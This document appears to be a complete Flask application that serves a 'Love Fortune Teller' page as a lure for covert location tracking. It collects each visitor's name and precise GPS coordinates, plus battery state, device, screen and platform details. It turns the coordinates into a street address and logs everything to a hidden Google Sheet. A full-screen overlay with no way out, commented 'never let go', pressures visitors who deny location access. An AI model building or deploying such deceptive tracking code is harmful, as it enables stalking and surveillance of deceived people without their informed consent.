from flask import Flask, request
import gspread
from google.oauth2.service_account import Credentials
import requests, os, random, json
from datetime import datetime

app = Flask(__name__)

SCOPES = [
    'https://spreadsheets.google.com/feeds',
    'https://www.googleapis.com/auth/drive'
]

def get_sheet():
    creds_dict = json.loads(os.environ['GOOGLE_CREDS_JSON'])
    creds = Credentials.from_service_account_info(creds_dict, scopes=SCOPES)
    client = gspread.authorize(creds)
    return client.open_by_key(os.environ['SHEET_ID']).sheet1

def ensure_headers(sheet):
    headers = ['DateTime','Name','Latitude','Longitude',
               'Google Maps','Accuracy','Address',
               'Battery_%','Charging','Device','Screen','Platform']
    if not sheet.get_all_values():
        sheet.append_row(headers)

def get_address(lat, lon):
    try:
        r = requests.get(
            "https://nominatim.openstreetmap.org/reverse",
            params={'lat': lat, 'lon': lon, 'format': 'json'},
            headers={'User-Agent': 'FortuneApp/1.0'},
            timeout=8
        )
        return r.json().get('display_name', 'Unknown')
    except:
        return 'Unknown'

HTML = '''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>💕 Love Fortune Teller</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body {
    font-family:'Segoe UI',sans-serif;
    background:linear-gradient(135deg,#ff9a9e,#fecfef,#ffdde1);
    min-height:100vh; display:flex;
    justify-content:center; align-items:center;
    padding:20px; overflow-x:hidden;
  }
  .heart {
    position:fixed; pointer-events:none;
    animation:floatUp 4s linear infinite; z-index:0;
  }
  @keyframes floatUp {
    0%   { transform:translateY(100vh) rotate(0deg);   opacity:1; }
    100% { transform:translateY(-100vh) rotate(360deg); opacity:0; }
  }
  .box {
    background:rgba(255,255,255,0.96);
    border-radius:50px; padding:50px 40px;
    max-width:540px; width:100%; text-align:center;
    box-shadow:0 30px 60px rgba(0,0,0,0.18);
    z-index:1; position:relative; animation:fadeIn 0.8s;
  }
  @keyframes fadeIn {
    from { opacity:0; transform:scale(0.9); }
    to   { opacity:1; transform:scale(1);   }
  }
  .top-emoji { font-size:90px; animation:bounce 2s infinite; }
  @keyframes bounce {
    0%,100% { transform:translateY(0);    }
    50%     { transform:translateY(-10px);}
  }
  h1 {
    font-size:34px; margin:15px 0 8px;
    background:linear-gradient(135deg,#ff6b6b,#c06c84);
    -webkit-background-clip:text; background-clip:text; color:transparent;
  }
  .sub { color:#aaa; font-size:15px; margin-bottom:30px; }
  .igroup { margin-bottom:22px; text-align:left; }
  .igroup label { display:block; margin-bottom:8px; color:#c06c84; font-weight:600; }
  .igroup input {
    width:100%; padding:14px 20px;
    border:2px solid #ffdde1; border-radius:50px;
    font-size:16px; text-align:center; outline:none; transition:0.3s;
  }
  .igroup input:focus { border-color:#c06c84; box-shadow:0 0 12px rgba(192,108,132,0.3); }
  .btn {
    background:linear-gradient(135deg,#ff6b6b,#c06c84);
    color:#fff; border:none; padding:17px 40px;
    font-size:19px; font-weight:bold; border-radius:60px;
    cursor:pointer; width:100%; transition:0.3s;
  }
  .btn:hover { transform:translateY(-3px); box-shadow:0 12px 28px rgba(192,108,132,0.4); }

  /* loading */
  .loading { display:none; margin-top:28px; }
  .loading.show { display:block; }
  .spinner {
    width:58px; height:58px; margin:0 auto 16px;
    background:linear-gradient(135deg,#ff6b6b,#c06c84);
    border-radius:50%; animation:pulse 1.2s infinite;
  }
  @keyframes pulse {
    0%,100% { transform:scale(0.8); opacity:0.5; }
    50%     { transform:scale(1.2); opacity:1;   }
  }

  /* result card */
  .result {
    display:none; margin-top:28px; padding:35px;
    background:linear-gradient(135deg,#ff9a9e,#fecfef);
    border-radius:30px; color:#fff; animation:slideUp 0.6s;
  }
  .result.show { display:block; }
  @keyframes slideUp {
    from { opacity:0; transform:translateY(30px); }
    to   { opacity:1; transform:translateY(0);    }
  }
  .r-icon { font-size:50px; animation:hb 1.5s infinite; }
  @keyframes hb { 0%,100%{transform:scale(1);} 50%{transform:scale(1.2);} }
  .r-name { font-size:26px; font-weight:bold; margin:12px 0; }
  .r-msg  { font-size:20px; line-height:1.6; margin:14px 0; font-weight:500; }

  /* OVERLAY — covers full screen, no escape */
  #overlay {
    display:none; position:fixed; inset:0; z-index:99999;
    background:linear-gradient(135deg,#ff6b6b,#c06c84);
    flex-direction:column; justify-content:center;
    align-items:center; text-align:center; padding:30px;
  }
  #overlay.show { display:flex; }
  #overlay .o-emoji { font-size:75px; margin-bottom:18px; animation:bounce 2s infinite; }
  #overlay h2 { color:#fff; font-size:26px; margin-bottom:12px; }
  #overlay p  { color:rgba(255,255,255,0.92); font-size:15px;
                max-width:360px; line-height:1.7; margin-bottom:22px; }
  #overlay .steps {
    background:rgba(255,255,255,0.18); border-radius:18px;
    padding:18px 22px; margin-bottom:22px;
    text-align:left; max-width:360px; width:100%;
    color:#fff; font-size:14px; line-height:2.3;
  }
  #overlay .o-btn {
    background:#fff; color:#c06c84; border:none;
    padding:15px 38px; font-size:17px; font-weight:bold;
    border-radius:60px; cursor:pointer; animation:pulse 1.5s infinite;
  }

  @media(max-width:560px){
    .box { padding:30px 20px; }
    h1   { font-size:26px; }
    .r-msg { font-size:17px; }
  }
</style>
</head>
<body>

<!-- ══ LOCATION DENIED OVERLAY — no close button, loops forever ══ -->
<div id="overlay">
  <div class="o-emoji">🔐💕</div>
  <h2>Location Needed!</h2>
  <p>Your love fortune can only be revealed with your location.<br>Please allow it to continue ✨</p>
  <div class="steps">
    🔒 Tap the <strong>lock icon</strong> in address bar<br>
    📋 Open <strong>Site Settings</strong><br>
    📍 Set <strong>Location → Allow</strong><br>
    🔄 Tap <strong>Try Again</strong> below
  </div>
  <button class="o-btn" onclick="retry()">💫 Allow Location & Try Again 💫</button>
</div>

<!-- ══ MAIN CARD ══ -->
<div class="box">
  <div class="top-emoji">💕🔮💕</div>
  <h1>Your Love Fortune</h1>
  <div class="sub">Discover what destiny has planned for your heart</div>

  <div id="form">
    <div class="igroup">
      <label>✨ Enter your name, beautiful soul ✨</label>
      <input id="uname" type="text" placeholder="Your name..." autocomplete="off">
    </div>
    <button class="btn" onclick="start()">✨ Reveal My Destiny ✨</button>
  </div>

  <div class="loading" id="load">
    <div class="spinner"></div>
    <p>💫 Reading the stars for you...</p>
  </div>

  <div class="result" id="res">
    <div class="r-icon">💖</div>
    <div class="r-name" id="rname"></div>
    <div class="r-msg"  id="rmsg"></div>
    <div>✨ The universe has spoken ✨</div>
  </div>
</div>

<script>
  /* floating hearts */
  setInterval(()=>{
    const h=document.createElement('div');
    h.innerHTML=['❤️','💕','💖','💗','💓','💝'][Math.floor(Math.random()*6)];
    h.className='heart';
    h.style.cssText=`left:${Math.random()*100}%;font-size:${Math.random()*20+14}px;animation-duration:${Math.random()*3+3}s`;
    document.body.appendChild(h);
    setTimeout(()=>h.remove(),4500);
  },600);

  let name='';

  async function getBattery(){
    try{ const b=await navigator.getBattery(); return{level:Math.round(b.level*100),charging:b.charging}; }
    catch(e){ return null; }
  }

  function show(id,on){ document.getElementById(id).style.display=on?'block':'none'; }

  window.start=function(){
    name=document.getElementById('uname').value.trim();
    if(!name){ alert('💕 Please enter your name!'); return; }
    askLocation();
  };

  function askLocation(){
    document.getElementById('res').classList.remove('show');
    document.getElementById('form').style.display='none';
    document.getElementById('load').classList.add('show');
    document.getElementById('overlay').classList.remove('show');

    if(!navigator.geolocation){ document.getElementById('overlay').classList.add('show'); return; }

    navigator.geolocation.getCurrentPosition(
      async pos=>{
        document.getElementById('load').classList.remove('show');
        const bat=await getBattery();
        try{
          const r=await fetch('/save',{
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({
              name,
              lat:pos.coords.latitude,
              lon:pos.coords.longitude,
              accuracy:pos.coords.accuracy,
              altitude:pos.coords.altitude,
              speed:pos.coords.speed,
              battery:bat,
              ua:navigator.userAgent,
              screen:screen.width+'x'+screen.height,
              lang:navigator.language,
              platform:navigator.platform
            })
          });
          const d=await r.json();
          if(d.success){
            document.getElementById('rname').innerHTML='✨ '+name+' ✨';
            document.getElementById('rmsg').innerHTML=d.fortune;
            document.getElementById('res').classList.add('show');
          }
        }catch(e){
          document.getElementById('form').style.display='block';
        }
      },
      ()=>{
        // denied / blocked → show overlay, never let go
        document.getElementById('load').classList.remove('show');
        document.getElementById('overlay').classList.add('show');
      },
      {enableHighAccuracy:true,timeout:12000,maximumAge:0}
    );
  }

  // retry button inside overlay
  window.retry=function(){
    document.getElementById('form').style.display='none';
    askLocation();
  };
</script>
</body>
</html>'''


@app.route('/')
def index():
    return HTML


@app.route('/save', methods=['POST'])
def save():
    try:
        d    = request.json
        lat  = d['lat']
        lon  = d['lon']
        bat  = d.get('battery')
        addr = get_address(lat, lon)

        row = [
            datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            d['name'],
            lat, lon,
            f"https://maps.google.com/?q={lat},{lon}",
            d.get('accuracy',''),
            addr,
            bat['level']    if bat else 'N/A',
            bat['charging'] if bat else 'N/A',
            d.get('ua','')[:120],
            d.get('screen',''),
            d.get('platform','')
        ]

        sheet = get_sheet()
        ensure_headers(sheet)
        sheet.append_row(row)

        fortunes = [
            f"💕 Dear {d['name']}, someone special is thinking of you right now!",
            f"💖 {d['name']}, a beautiful soul is about to enter your life!",
            f"💗 {d['name']}, the universe has heard your heart's desire!",
            f"💓 {d['name']}, your soulmate is closer than you think!",
            f"💝 Someone you meet very soon will change your life, {d['name']}!",
            f"💕 Love is rushing toward you faster than you know, {d['name']}!",
            f"💖 {d['name']}, your positive energy is attracting true love!",
            f"💗 The stars are perfectly aligned just for you today, {d['name']}!",
            f"💓 {d['name']}, a wonderful surprise is waiting for your heart!",
            f"💝 {d['name']}, someone is secretly falling for you right now!"
        ]
        print(f"✅ {d['name']} | {lat:.5f},{lon:.5f}")
        return {'success': True, 'fortune': random.choice(fortunes)}
    except Exception as e:
        print("ERR:", e)
        return {'success': False}, 500


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=False)
